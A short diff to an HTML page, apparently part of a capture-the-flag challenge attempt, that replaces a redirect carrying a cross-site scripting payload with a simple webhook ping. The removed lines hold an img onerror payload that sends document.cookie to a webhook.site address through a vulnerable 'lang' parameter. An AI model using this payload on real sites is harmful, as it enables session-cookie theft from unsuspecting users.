@@ -1,19 +1,12 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <meta charset="UTF-8">
     <script>
-      // Payload using <img onerror> to bypass <script> filtering
-      const payload = `<img src=x onerror="fetch('https://webhook.site/0084921d-f965-4a88-aa8b-bd2c25e26d82?c=' + document.cookie)">`;
-
-      // Redirect to vulnerable page with payload in lang param
-      const redirectURL = "https://chal1.lagncra.sh:8426/zone?lang=" + encodeURIComponent(payload);
-      window.location.href = redirectURL;
+      // Just ping your webhook — no cookie logic
+      fetch("https://webhook.site/0084921d-f965-4a88-aa8b-bd2c25e26d82?visited=github")
     </script>
   </head>
   <body>
-    Redirecting...
+    If you see this, the bot is visiting.
   </body>
 </html>
-
-
